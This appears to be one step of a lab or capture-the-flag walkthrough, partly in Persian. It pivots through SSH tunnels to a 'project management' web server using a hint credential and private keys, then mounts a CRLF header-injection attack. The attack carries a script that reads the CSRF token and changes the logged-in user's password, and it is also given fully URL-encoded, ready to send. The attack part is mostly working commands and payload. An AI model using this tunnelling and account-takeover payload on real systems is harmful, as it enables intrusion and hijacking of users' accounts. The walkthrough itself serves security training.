# Project Management

1. **Resume From [PC2](<../5_PC2/>)**

2. **Hint:**

    ```text
    ۱. 
    faraji:P@ssw0rd!
    ۲. 
    دسترسی ادمین را بدست آورید 
    ```

3. **Ping project management server from PC2:**

```shell
ssh -N -i ./id_ed25519 -p 2200 -L 0.0.0.0:7777:10.233.27.37:22 vpn_user@172.16.3.64
```

In a new terminal:

```shell
ssh -p 7777 -i 05-rsa.rezaee.priv rezaee@127.0.0.1
ping pm
```

Project management server IP: `10.233.58.241`

4. **Check which ports are open on the project management server:**

    1. **Check if port 22 and 2200 are open on project management server for ssh:**

```shell
ssh faraji@10.233.58.241
ssh -p 2200 faraji@10.233.58.241
```

2. **Check if port 80 is open on project management server for http:**

```shell
nc -zv 10.233.58.241 80
```

Output:

```shell
Connection to  port 80 10.233.58.241 succeeded!
```

5. **Create an SSH tunnel to access port 80 on the project management server:**

```shell
ssh -N -i ./id_ed25519 -p 2200 -L 18080:10.233.58.241:80 vpn_user@172.16.3.64
```

6. **Access the project management server through the tunnel:**

```shell
http://localhost:18080
```

7. **CRLF Injection Attack**

```shell
‍‍‍‍```html
X-XSS-Protection:0

23
<script></script>
0
//..

```

```javascript
    var token = document.getElementById('csrf_token').value;

    fetch('/changepassword', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'csrf_token': token,
            'new_password': '12345678',
            'confirm_password': '12345678'
        })
    }).catch(error => console.error('Error:', error));
```

```html
X-XSS-Protection:0

23
<script>var token = document.getElementById('csrf_token').value;

    fetch('/changepassword', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'csrf_token': token,
            'new_password': '12345678',
            'confirm_password': '12345678'
        })
    }).catch(error => console.error('Error:', error));</script>
0
//..
```

 encode this to url

`%58%2d%58%53%53%2d%50%72%6f%74%65%63%74%69%6f%6e%3a%30%0a%0a%32%33%0a%3c%73%63%72%69%70%74%3e%76%61%72%20%74%6f%6b%65%6e%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%63%73%72%66%5f%74%6f%6b%65%6e%27%29%2e%76%61%6c%75%65%3b%0a%0a%20%20%20%20%66%65%74%63%68%28%27%2f%63%68%61%6e%67%65%70%61%73%73%77%6f%72%64%27%2c%20%7b%0a%20%20%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%0a%20%20%20%20%20%20%20%20%68%65%61%64%65%72%73%3a%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%43%6f%6e%74%65%6e%74%2d%54%79%70%65%27%3a%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%27%0a%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%20%20%20%20%62%6f%64%79%3a%20%6e%65%77%20%55%52%4c%53%65%61%72%63%68%50%61%72%61%6d%73%28%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%63%73%72%66%5f%74%6f%6b%65%6e%27%3a%20%74%6f%6b%65%6e%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%6e%65%77%5f%70%61%73%73%77%6f%72%64%27%3a%20%27%31%32%33%34%35%36%37%38%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%27%63%6f%6e%66%69%72%6d%5f%70%61%73%73%77%6f%72%64%27%3a%20%27%31%32%33%34%35%36%37%38%27%0a%20%20%20%20%20%20%20%20%7d%29%0a%20%20%20%20%7d%29%2e%63%61%74%63%68%28%65%72%72%6f%72%20%3d%3e%20%63%6f%6e%73%6f%6c%65%2e%65%72%72%6f%72%28%27%45%72%72%6f%72%3a%27%2c%20%65%72%72%6f%72%29%29%3b%3c%2f%73%63%72%69%70%74%3e%0a%30%0a%2f%2f%2e%2e`
